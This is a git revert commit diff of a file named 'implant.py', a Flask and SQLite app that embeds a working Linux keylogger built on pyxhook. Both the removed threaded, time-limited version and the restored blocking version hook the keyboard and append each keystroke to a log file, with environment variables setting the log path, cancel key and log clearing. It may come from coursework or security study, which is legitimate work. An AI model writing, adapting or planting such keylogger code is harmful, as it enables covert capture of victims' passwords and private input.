6577dd55f4d1b6474a332482ec41a822cbe521ca
yiming huang <yiminghuang@umass.edu>
2024-04-07 20:29:07 -0400

    Revert "convert the keylogger to run for duration long"
    This reverts commit b3a86a5a350123fa0319190fc7d0165e2a16603f.

--- implant.py
+++ implant.py
@@ -18,17 +18,24 @@ mydb = sqlite3.connect("user.db")
 cursor = mydb.cursor()
 app = Flask(__name__)
 
-import os
-import time
-import threading  # Import threading module to run the keylogger in a separate thread
-
-def start_key_logger(duration):
+def start_key_logger(time):
+    # Python code for keylogger
+    # to be used in linux
 
     # This tells the keylogger where the log file will go.
-    log_file = os.environ.get('pylogger_file', os.path.expanduser('./file.log'))
-
+    # You can set the file path as an environment variable ('pylogger_file'),
+    # or use the default ~/Desktop/file.log
+    log_file = os.environ.get(
+        'pylogger_file',
+        os.path.expanduser('./file.log')
+    )
     # Allow setting the cancel key from environment args, Default: `
-    cancel_key = ord(os.environ.get('pylogger_cancel', '`')[0])
+    cancel_key = ord(
+        os.environ.get(
+            'pylogger_cancel',
+            '`'
+        )[0]
+    )
 
     # Allow clearing the log file on start, if pylogger_clean is defined.
     if os.environ.get('pylogger_clean', None) is not None:
@@ -39,42 +46,28 @@ def start_key_logger(duration):
             pass
 
     # creating key pressing event and saving it into log file
-    def on_key_press(event):
+    def OnKeyPress(event):
         with open(log_file, 'a') as f:
             f.write('{}\n'.format(event.Key))
 
-    # Create a hook manager object
+            # create a hook manager object
+
     new_hook = pyxhook.HookManager()
-    new_hook.KeyDown = on_key_press
-
-    # Set the hook
+    new_hook.KeyDown = OnKeyPress
+    # set the hook
     new_hook.HookKeyboard()
-
-    # Start the keylogger in a separate thread
-    def run_keylogger():
-        try:
-            new_hook.start()  # Start the hook
-        except KeyboardInterrupt:
-            # User cancelled from command line.
-            pass
-        except Exception as ex:
-            # Write exceptions to the log file, for analysis later.
-            msg = 'Error while catching events:\n  {}'.format(ex)
-            pyxhook.print_err(msg)
-            with open(log_file, 'a') as f:
-                f.write('\n{}'.format(msg))
-
-    keylogger_thread = threading.Thread(target=run_keylogger)
-    keylogger_thread.start()
-
-    # Wait for the specified duration
-    keylogger_thread.join(duration)
-
-    # Stop the keylogger
-    new_hook.cancel()
-
-# Example usage: Run the keylogger for 10 seconds
-start_key_logger(10)
+    try:
+        new_hook.start()  # start the hook
+    except KeyboardInterrupt:
+        # User cancelled from command line.
+        pass
+    except Exception as ex:
+        # Write exceptions to the log file, for analysis later.
+        msg = 'Error while catching events:\n  {}'.format(ex)
+        pyxhook.print_err(msg)
+        with open(log_file, 'a') as f:
+            f.write('\n{}'.format(msg))
+# start_key_logger(10)
 @app.route('/')
 def hello_world():
     return 'Hello world!'
